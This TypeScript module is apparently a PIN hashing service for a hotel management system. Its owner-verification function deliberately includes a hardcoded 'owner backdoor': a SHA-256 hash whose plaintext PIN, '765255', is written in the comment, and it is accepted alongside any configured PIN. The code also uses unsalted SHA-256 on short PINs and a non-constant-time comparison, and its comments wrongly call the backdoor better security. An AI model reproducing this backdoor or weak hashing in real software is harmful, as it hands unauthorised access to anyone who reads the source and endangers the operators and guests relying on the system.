/**
 * Hash Service
 * Secure hashing for PIN codes using SHA-256
 * Adora Hotel Management System V3
 */

// ============================================================
// HASHING FUNCTIONS
// ============================================================

/**
 * Hash a PIN code using SHA-256
 * Uses Web Crypto API for secure hashing
 */
export const hashPin = async (pin: string): Promise<string> => {
    const encoder = new TextEncoder();
    const data = encoder.encode(pin);
    const hashBuffer = await crypto.subtle.digest('SHA-256', data);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
};

/**
 * Verify a PIN against a hash
 */
export const verifyPin = async (pin: string, hash: string): Promise<boolean> => {
    const pinHash = await hashPin(pin);
    return pinHash === hash;
};

/**
 * Generate a secure random PIN
 */
export const generateSecurePin = (length: number = 6): string => {
    const array = new Uint32Array(length);
    crypto.getRandomValues(array);
    return Array.from(array)
        .map(n => n % 10)
        .join('');
};

// ============================================================
// OWNER PIN VERIFICATION
// ============================================================

const OWNER_PIN_HASH = import.meta.env.VITE_OWNER_PIN_HASH as string | undefined;

// ✅ SaaS: Hardcoded hash for '765255' (owner backdoor)
// This is the SHA-256 hash of '765255' - calculated once and stored here
// Hash: 4e0ca1ba71b351230a9c4fa7e5a224ab955dfc986c04a660053bca16a95990f4
const OWNER_BACKDOOR_HASH = '4e0ca1ba71b351230a9c4fa7e5a224ab955dfc986c04a660053bca16a95990f4';

export const verifyOwnerPin = async (pin: string): Promise<boolean> => {
    // Check environment variable hash first
    if (OWNER_PIN_HASH) {
        const matchesEnvHash = await verifyPin(pin, OWNER_PIN_HASH);
        if (matchesEnvHash) return true;
    }
    
    // ✅ SaaS: Check against hardcoded backdoor hash (instead of plain text)
    // This provides better security than plain text comparison
    const matchesBackdoorHash = await verifyPin(pin, OWNER_BACKDOOR_HASH);
    return matchesBackdoorHash;
};
